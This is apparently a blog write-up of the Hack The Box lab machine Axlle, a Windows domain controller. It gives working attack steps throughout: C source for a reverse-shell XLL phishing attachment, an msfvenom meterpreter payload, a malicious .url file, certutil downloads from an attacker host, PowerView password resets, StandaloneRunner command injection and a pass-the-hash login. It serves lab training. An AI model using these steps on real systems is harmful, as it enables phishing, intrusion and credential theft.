---
date: 2024-11-15T17:00:51-06:00
# description: ""
image: "/images/HTB-Axlle/Axlle.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Axlle"
type: "post"
---

* Platform: Hack The Box
* Link: [Axlle](https://app.hackthebox.com/machines/Axlle)
* Level: Hard
* OS: Windows
---

[Read this write up in french](https://scorpiosec.com/fr/posts/htb-axlle/)

Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a `.xll` attachment to gain an initial foothold. On the compromised target, we discover an `.eml` file containing details about an automated task. By leveraging this information, we craft a malicious `.url` file, enabling lateral movement to another user account and accessing the user flag. Using BloodHound, we identify the ability to force password changes on specific accounts. Exploiting this privilege, we perform another lateral movement. Finally, privilege escalation is achieved through command injection via a Windows utility.

Target IP address - `10.10.11.21`

## Scanning

```
./nmap_scan.sh 10.10.11.21 Axlle
```

**Results**

```shell
Running detailed scan on open ports: 25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,61050,61051,61052,61056,61058,61071
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 17:09 CST
Nmap scan report for 10.10.11.21
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Axlle Development
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-15 23:09:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
61050/tcp open  msrpc         Microsoft Windows RPC
61051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61052/tcp open  msrpc         Microsoft Windows RPC
61056/tcp open  msrpc         Microsoft Windows RPC
61058/tcp open  msrpc         Microsoft Windows RPC
61071/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-15T23:10:45
|_  start_date: N/A
|_clock-skew: 7s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.31 seconds
```

Our target is a domain controller, on top of the usual AD services it features:
* A SMTP server on port 25 with hMailServer
* A web server on port 80 with Microsoft IIS 
* The domain name is `axlle.htb` which we add to the `/etc/hosts` file.

## Enumeration

At `http://axlle.htb/` we find a software development company website. It is under maintenance but we do get an email address for contact.

![Axlle website](/images/HTB-Axlle/axlle_website.png)

Besides the information we gained earlier nothing stands out on the website, we try some directory bruteforcing but nothing valuable is found.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://axlle.htb/ 
```

![directory brute forcing attempt](/images/HTB-Axlle/gobuster_axlle.png)

Our subdomain enumeration attempt is equally unhelpful.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://axlle.htb -H "Host: FUZZ.axlle.htb" -ic -fs 10228
```

![subdomain enumeration attempt](/images/HTB-Axlle/ffuf_axlle.png)

## Initial Foothold

Previously we learned that the attachments we send to `accounts@axlle.htb` have to be in excel format, but we cannot make use of macros since they are disabled. Another way to create phishing emails is by using `xll` files. 

> `.xll` files are Excel Add-In files used to extend the functionality of Microsoft Excel.

On [this website](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec) we find an exploit called `XLL - EXEC` which we can use to gain a reverse shell by sending an email with a `.xll` attachmnent. The first step is to add a reverse shell to the exploit. 

```C
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
    WinExec("PowerShell#3 from revshells.com", 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Then we compile the C program into a shared library.

```
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll phishing.c -luser32
```

![xll compilation](/images/HTB-Axlle/xll_compilation.png)


Finally we send the email with [swaks](https://github.com/jetmore/swaks).

![phishing email sent](/images/HTB-Axlle/phishing_email.png)

```
swaks --to accounts@axlle.htb --from kscorpio@axlle.htb --header "Subject: Open the doors" --body "Nothing to see here..." --attach @shell.xll
```

After a couple of minutes we get a shell as `gideon.hamill`.

![shell as gideon.hamill](/images/HTB-Axlle/foothold.png)

### Rabbit Hole (Database exploitation)

This account does not have anything interesting in the common directories such as `Desktop`, `Documents`, and `Downloads`; we probably need to look elsewhere. From experience we know that `hMailServer` usually has some hard coded password in its `INI` file. We access it at `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI` and discover the administrator password and the database password.

![hMailServer passwords found](/images/HTB-Axlle/hmailserver_pwds.png)

We are unable to crack the first hash, but if we manage to recover the database password we might be able to recover some users passwords. We can use [this decrypter](https://github.com/GitMirar/hMailDatabasePasswordDecrypter) to find the database password, `4A02D41C55AC`.

![database password](/images/HTB-Axlle/database_pwd.png)

Since the database type is `MSSQLCE`, we can download the `.sdf` file on our local machine (I used the `download` command in a meterpreter shell). The `.sdf` file is in `C:\Program Files (x86)\hMailServer\Database`.

![sdf file location](/images/HTB-Axlle/sdf_file_location.png)

> An `.sdf` file (SQL Server Compact Database File) is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).

Go on [rebasedata](https://www.rebasedata.com) and convert your `.sdf` file to a `sqlite` format.

![sdf file conversion](/images/HTB-Axlle/sdf_file_conversion.png)

After the conversion is completed, download the `result.zip` file. Extract it and you will get a file called `data.sqlite`. Run the following queries and you will find a hash for `accounts@axlle.htb`.

```
sqlite3 data.sqlite
.tables
SELECT * FROM hm_accounts;
```

![database password hash found](/images/HTB-Axlle/db_hashes.png)

Unfortunately we are unable to also crack this hash, let's assume this was a rabbit hole and look for another exploitation path.

![hmailserver hash cracking failure](/images/HTB-Axlle/hmailserver_hashcrack_fail.png)

### .URL file exploitation (shell as dallon.matrix)

In `C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F` we find an `.eml` file.

> An `.eml` file is an email message saved in the MIME RFC 822 standard format. These files are typically created by email programs such as Microsoft Outlook, Mozilla Thunderbird, and others. The `.eml` file format preserves the original email header, body, and any attachments, making it useful for archiving and transferring email messages.

![eml file location](/images/HTB-Axlle/eml_file.png)

We send it to our local machine via FTP (it can also be done with the `download` command in meterpreter used earlier).

```
pip3 install pyftpdlib
python3 -m pyftpdlib --port 21 --write
```

On the target run the command below and you will receive the eml file on the FTP server:

```
(New-Object Net.WebClient).UploadFile('ftp://YOUR_IP/{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml', 'C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml')
```

![eml file download](/images/HTB-Axlle/eml_file_dl.png)

We learn that we can drop some URLs in the `C:\inetpub\testing` folder, and they will be automatically executed.

![content of eml file](/images/HTB-Axlle/webdev-team-email.png)

We can upload a `.url` file that points to a malicious file into the `testing` folder.

> `.url` files are commonly known as internet shortcuts. They are used to create shortcuts to websites or web resources, allowing users to quickly access them without having to navigate through a web browser.

1. Create an `.exe` file with msfvenom.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
```

![malicious exe file](/images/HTB-Axlle/malicious_exe.png)

2. Set up the listener in Metasploit.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost YOUR_IP
set lport PORT_NUMBER
run
```

3. Create the `.url` file with the following content.

```
[InternetShortcut]
URL=file://YOUR_IP/share/payload.exe
```

4. Start a SMB server and a web server.

```
impacket-smbserver -smb2support share .

python3 -m http.server
```

![smb server](/images/HTB-Axlle/smb-server.png)

5. Place the .url file in the testing folder.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/evil.url evil.url
```

![evil url file download](/images/HTB-Axlle/evil_url_download.png)

After a few seconds we get a meterpreter shell as `dallon.matrix`.

![dallon.matrix shell](/images/HTB-Axlle/dallon_shell.png)

Note that we also get the password hash of `dallon.matrix` on the SMB server.

![dallon.matrix password hash](/images/HTB-Axlle/dallon_pwd_hash.png)

But we are unable to crack it.

```
hashcat -a 0 -m 5600 dallon_hash.txt /usr/share/wordlists/rockyou.txt
```

![dallon.matrix password hash crack failure](/images/HTB-Axlle/dallon_hashcrack_fail.png)

On the Desktop, we find the user flag.

![user flag](/images/HTB-Axlle/user_flag.png)

### Lateral Movement (shell as baz.humphries)

For the Active Directory enumeration we will use [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe).

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
```

After executing it, download the `zip` file.

![sharphound zip file](/images/HTB-Axlle/sharphound_zip_file.png)

Unzip it and load the files into Bloodhound.

Find `dallon.matrix` and you will see that he is a member of the `Web Devs` group.

![web devs group](/images/HTB-Axlle/web_devs_group.png)

The members of the `Web Devs` group can change the password of `Baz.Humphries` and `Jacob.Greeny` because of `ForceChangePassword` which we can abuse with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

> This account attribute allows the enforcement of a password change even without knowing the user's current password. *Read more about it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword).*

![ForceChangePassword](/images/HTB-Axlle/ForeceChangePassword.png)

Import PowerView on the target.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1

Import-Module ./powerview.ps1
```

We change the password of `baz.humphries`.

```
$pass = ConvertTo-SecureString 'PleaseLetMeIn007!' -AsPlainText -Force

Set-DomainUserPassword -Identity Baz.Humphries -AccountPassword $pass
```

![Baz Humphries password change](/images/HTB-Axlle/password_change.png)

We login with evil-winrm as `baz.humphries`.

```
evil-winrm -u "baz.humphries" -p PleaseLetMeIn007! -i axlle.htb
```

![Baz Humphries login](/images/HTB-Axlle/baz_humphries_login.png)

## Privilege Escalation

In `C:\App Development\kbfiltr` we find a `README.md` file. One of the line reads "**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**".

![README location](/images/HTB-Axlle/README-location.png)

[This Github page](https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md) shows how to exploit `StandaloneRunner.exe`.

1. Create a `reboot.rsf` file, its content should be as below. This file should be in the current directory of execution where the `exe` and `dll` files are.

```
myTestDir
True
```

2. Create a directory with the following structure `myTestDir\working`.

3. Create an empty `rsf.rsf` file inside `myTestDir\working`.

4. Create `command.txt` with the reverse shell command in the same directory as `standalonerunner.exe`. (for the reverse shell I used PowerShell #3 (Base64) on [revshells.com](https://www.revshells.com/))

We can use the powershell script below to automate all these steps.

```powershell
certutil.exe -urlcache -split -f "http://YOUR_IP:WEBSERVER_PORT/reboot.rsf" "reboot.rsf"

New-Item -Path "myTestDir\working" -ItemType "Directory" -Force

New-Item -Path "myTestDir\working" -Name "rsf.rsf" -ItemType "File"

certutil.exe -urlcache -split -f "http://YOUR_IP:WEBSERVER_PORT/command.txt" "command.txt"
```

![exploit script](/images/HTB-Axlle/exploit_script.png)

After a few seconds we get a shell as administrator and we can read the root flag.

![root flag](/images/HTB-Axlle/root_flag.png)

## Beyond Root

Our access to the administrator account is a long and tedious process. In order to establish persistence we can switch to a meterpreter shell and dump the hashes with `hashdump`. We then recover the password hashes of many accounts on the target.

![hashdump command](/images/HTB-Axlle/hashdump.png)

We do not even need to crack it, since we can use them with evil-winrm in order to login.

```
evil-winrm -u "Administrator" -H 6322b5b9f9daecb0fefd594fa6fafb6a -i dc.axlle.htb
```

![administrator login via evil-winrm](/images/HTB-Axlle/Admin-login.png)

Thank you for reading this write up!
